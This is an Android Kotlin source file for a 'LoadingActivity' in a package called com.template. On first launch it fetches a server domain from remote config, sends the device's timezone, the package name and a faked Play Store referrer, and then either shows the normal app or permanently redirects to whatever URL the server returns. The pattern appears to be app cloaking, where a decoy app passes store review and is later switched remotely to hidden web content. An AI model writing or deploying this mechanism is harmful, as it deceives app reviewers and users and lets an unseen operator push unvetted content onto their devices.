package com.template

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowInsets
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.analytics.ktx.analytics
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.ktx.get
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import com.template.preferences.FirstRunPreferences
import com.template.preferences.ServerAnswerPreferences
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.jsoup.HttpStatusException
import org.jsoup.Jsoup
import org.jsoup.nodes.Document
import java.util.*


// Remote Config keys
private const val DOMAIN_KEY = "check_link"
private const val TAG = "LoadingActivity"

class LoadingActivity : AppCompatActivity() {
    private lateinit var firebaseAnalytics: FirebaseAnalytics
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        firebaseAnalytics = Firebase.analytics

        if (!checkForInternet(this)) {
            openMainActivity()
            return
        }

        val remoteConfig: FirebaseRemoteConfig = Firebase.remoteConfig
        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }
        remoteConfig.setConfigSettingsAsync(configSettings)

        if (FirstRunPreferences.isFirstRun(context = this)) {
            remoteConfig.fetchAndActivate()
                .addOnCompleteListener(this) { task ->
                    if (task.isSuccessful) {
                        FirstRunPreferences.setIsFirstRun(isFirstRun = false, context = this)
                        val domain = remoteConfig[DOMAIN_KEY].asString()
                        val reference =
                            "$domain/?packageid=$packageName" +
                                    "&usserid=${UUID.randomUUID()}" +
                                    "&getz=${TimeZone.getDefault().id}" +
                                    "&getr=utm_source=google-play&utm_medium=organic"
                        GlobalScope.launch {
                            withContext(Dispatchers.IO) {
                                try {
                                    val document: Document =
                                        Jsoup.connect(reference).ignoreContentType(true).get()
                                    val url = document.body().text()

                                    if (url.isBlank() || url.isEmpty()) {
                                        openMainActivity()
                                        return@withContext
                                    }

                                    openWebActivity(url = url)

                                    ServerAnswerPreferences.setServerAnswer(
                                        serverAnswer = url,
                                        context = this@LoadingActivity
                                    )
                                } catch (e: HttpStatusException) {
                                    ServerAnswerPreferences.setServerAnswer(
                                        serverAnswer = ServerAnswerPreferences.ERROR,
                                        context = this@LoadingActivity
                                    )
                                    openMainActivity()
                                }
                            }
                        }
                    } else {
                        openMainActivity()
                    }
                }
        } else {
            when (ServerAnswerPreferences.getServerAnswer(context = this)) {
                ServerAnswerPreferences.ERROR -> openMainActivity()
                null -> openMainActivity()
                else -> openWebActivity(ServerAnswerPreferences.getServerAnswer(context = this)!!)
            }
        }
    }

    private fun openMainActivity() {
        Intent(this, MainActivity::class.java).also { startActivity(it) }
    }

    private fun openWebActivity(url: String) {
        Intent(this, WebActivity::class.java)
            .apply { putExtra(WEB_ACTIVITY_URL, url) }
            .also { startActivity(it) }
    }

    private fun checkForInternet(context: Context): Boolean {
        // register activity with the connectivity manager service
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        // if the android version is equal to M
        // or greater we need to use the
        // NetworkCapabilities to check what type of
        // network has the internet connection
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Returns a Network object corresponding to
            // the currently active default data network.
            val network = connectivityManager.activeNetwork ?: return false

            // Representation of the capabilities of an active network.
            val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false

            return when {
                // Indicates this network uses a Wi-Fi transport,
                // or WiFi has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true

                // Indicates this network uses a Cellular transport. or
                // Cellular has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true

                // else return false
                else -> false
            }
        } else {
            // if the android version is below M
            @Suppress("DEPRECATION") val networkInfo =
                connectivityManager.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }
    }


}
